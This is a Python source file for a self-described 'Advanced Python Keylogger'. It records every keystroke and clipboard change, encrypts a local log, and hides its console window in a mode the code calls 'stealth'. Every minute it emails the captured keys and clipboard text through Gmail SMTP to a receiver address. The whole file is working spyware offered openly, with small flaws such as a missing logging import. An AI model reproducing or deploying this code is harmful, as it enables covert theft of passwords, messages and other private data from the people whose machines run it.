import os
import time
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard
from pynput.keyboard import Key, Listener
import pyperclip
from cryptography.fernet import Fernet

# Developed by Rabin
# Advanced Python Keylogger

# Configuration
LOG_FILE = "keylog.txt"
EMAIL_INTERVAL = 60  # Send logs every 60 seconds
EMAIL_ADDRESS = "your_email@example.com"
EMAIL_PASSWORD = "your_email_password"
RECEIVER_EMAIL = "receiver_email@example.com"
ENCRYPT_LOG = True  # Encrypt the log file
ENCRYPTION_KEY = Fernet.generate_key()  # Generate a key for encryption

# Initialize encryption
if ENCRYPT_LOG:
    cipher_suite = Fernet(ENCRYPTION_KEY)

# Global variables
log_data = ""
clipboard_data = ""
last_email_time = time.time()

# Function to write logs to file
def write_log(data: str) -> None:
    global log_data
    log_data += data
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        if ENCRYPT_LOG:
            encrypted_data = cipher_suite.encrypt(data.encode())
            f.write(encrypted_data.decode() + "\n")
        else:
            f.write(data)

# Function to send logs via email
def send_email() -> None:
    global log_data, clipboard_data, last_email_time
    if not log_data and not clipboard_data:
        return

    # Create email content
    subject = "Keylogger Report - Developed by Rabin"
    body = f"Key Logs:\n{log_data}\n\nClipboard Logs:\n{clipboard_data}"

    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECEIVER_EMAIL
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, RECEIVER_EMAIL, msg.as_string())
        logging.info("Email sent successfully.")
    except Exception as e:
        logging.error(f"Failed to send email: {e}")

    # Clear logs after sending
    log_data = ""
    clipboard_data = ""
    last_email_time = time.time()

# Function to monitor clipboard
def monitor_clipboard() -> None:
    global clipboard_data
    last_clipboard = pyperclip.paste()
    while True:
        time.sleep(1)
        current_clipboard = pyperclip.paste()
        if current_clipboard != last_clipboard:
            clipboard_data += f"[Clipboard]: {current_clipboard}\n"
            last_clipboard = current_clipboard

# Function to handle key presses
def on_press(key) -> None:
    try:
        # Log alphanumeric keys
        if hasattr(key, 'char') and key.char:
            write_log(key.char)
        # Log special keys
        elif key == Key.space:
            write_log(" ")
        elif key == Key.enter:
            write_log("\n")
        elif key == Key.backspace:
            write_log("[BACKSPACE]")
        elif key == Key.esc:
            write_log("[ESC]")
        elif key == Key.tab:
            write_log("[TAB]")
        elif key == Key.ctrl_l or key == Key.ctrl_r:
            write_log("[CTRL]")
        elif key == Key.alt_l or key == Key.alt_r:
            write_log("[ALT]")
        elif key == Key.shift:
            write_log("[SHIFT]")
        elif key == Key.caps_lock:
            write_log("[CAPS LOCK]")
        elif key == Key.cmd:
            write_log("[WIN]")
        else:
            write_log(f"[{key}]")
    except Exception as e:
        logging.error(f"Error logging key: {e}")

# Function to periodically send logs via email
def email_scheduler() -> None:
    while True:
        if time.time() - last_email_time >= EMAIL_INTERVAL:
            send_email()
        time.sleep(10)

# Main function
def main() -> None:
    # Hide the console window (for stealth mode)
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    # Start clipboard monitoring in a separate thread
    clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
    clipboard_thread.start()

    # Start email scheduler in a separate thread
    email_thread = threading.Thread(target=email_scheduler, daemon=True)
    email_thread.start()

    # Start keylogging
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
